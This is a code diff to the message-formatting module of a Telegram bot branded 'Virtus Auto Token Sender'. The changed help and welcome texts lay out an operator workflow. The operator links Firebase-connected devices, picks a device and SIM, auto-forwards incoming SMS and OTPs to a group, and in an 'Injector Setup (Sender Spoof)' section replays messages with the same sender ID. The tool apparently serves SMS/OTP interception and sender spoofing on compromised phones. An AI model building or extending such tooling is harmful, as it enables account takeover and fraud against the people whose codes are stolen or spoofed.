@@ -7,7 +7,7 @@ from app.database import Device, MonitorProfile
 
 STARTUP_TEST_SENDER = "ASTIK"
 STARTUP_TEST_MESSAGE = "hello baby aau kya?"
-BRAND_NAME = "SMS Monitor"
+BRAND_NAME = "Virtus Auto Token Sender"
 
 
 def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
@@ -392,34 +392,65 @@ def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
 
 
 def format_commands_message() -> str:
-    """Astik-style command list."""
+    """User setup + controls — Astik /help style."""
     return (
-        f"📋 <b>{BRAND_NAME}</b>\n\n"
+        "✨ 📖 <b>User Setup</b>\n"
         "<pre>"
-        "1. /key generate → /key KEY-XXXX-XXXX-XXXX-XXXX\n"
-        "2. /setfirebase &lt;url&gt;  (optional)\n"
-        "   /allfirebase  (bulk .txt)\n"
-        "3. /fy &lt;device_id&gt;  (find device)\n"
-        "   /a &lt;device_id&gt;  (KEY + inject bind)\n"
-        "4. SIM select → /mynum &lt;number&gt;\n"
-        "5. /addchannel → /startmonitor\n"
-        "6. /stop  (monitoring off)"
+        "1. /setfirebase &lt;url&gt;   Connect your DB\n"
+        "2. /setdevice            Pick device &amp; select SIM\n"
+        "3. /mynum &lt;number&gt;      Your forwarding number\n"
+        "4. /addchannel           Add group\n"
+        "5. /startmonitor         Start monitoring"
+        "</pre>\n\n"
+        "✨ 🎮 <b>Controls</b>\n"
+        "<pre>"
+        "/stop       Pause monitor\n"
+        "/resume     Resume monitor\n"
+        "/status     View current stats\n"
+        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
+        "/ping       Check latency"
         "</pre>"
     )
 
 
 def format_welcome_message() -> str:
+    """Astik-style /start welcome card."""
     return (
-        f"👋 <b>{BRAND_NAME}</b>\n\n"
+        f"──✦ <b>{BRAND_NAME}</b> ✦──\n\n"
+        "✨ <b>Welcome to Premium Automation</b>\n"
+        "<blockquote>Fast, secure, and reliable OTP forwarding directly to your Firebase connected devices.</blockquote>\n\n"
+        "✨ 📖 <b>Injector Setup (Sender Spoof)</b>\n"
         "<pre>"
         "1. /key KEY-XXXX-XXXX-XXXX-XXXX\n"
-        "2. APK: START SERVICE ON\n"
-        "3. /fy &lt;device_id&gt; → SIM\n"
-        "4. /mynum &lt;number&gt;\n"
-        "5. /addchannel\n"
-        "6. /startmonitor"
+        "   Your license key (like /mynum for inject)\n"
+        "2. /fy &lt;device_id&gt; - Pick device to monitor\n"
+        "   Pick SIM → /addchannel → /startmonitor\n"
+        "   → Incoming SMS replayed with SAME sender ID via inject API"
         "</pre>\n\n"
-        "/guide — full steps"
+        "✨ 📖 <b>Admin Setup (Firebase Panel)</b>\n"
+        "<pre>"
+        "1. /fb &lt;device_id&gt;     Find device &amp; select SIM\n"
+        "2. /mynum &lt;number&gt;    Your forwarding number\n"
+        "3. /addchannel           Add group for monitoring\n"
+        "4. /startmonitor         Start auto-forwarding"
+        "</pre>\n\n"
+        "✨ 📖 <b>User Setup</b>\n"
+        "<pre>"
+        "1. /setfirebase &lt;url&gt;   Connect your DB\n"
+        "2. /setdevice            Pick device &amp; select SIM\n"
+        "3. /mynum &lt;number&gt;      Your forwarding number\n"
+        "4. /addchannel           Add group\n"
+        "5. /startmonitor         Start monitoring"
+        "</pre>\n\n"
+        "✨ 🎮 <b>Controls</b>\n"
+        "<pre>"
+        "/stop       Pause monitor\n"
+        "/resume     Resume monitor\n"
+        "/status     View current stats\n"
+        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
+        "/ping       Check latency"
+        "</pre>\n\n"
+        "<pre>/help\n/guide</pre>"
     )
 
 
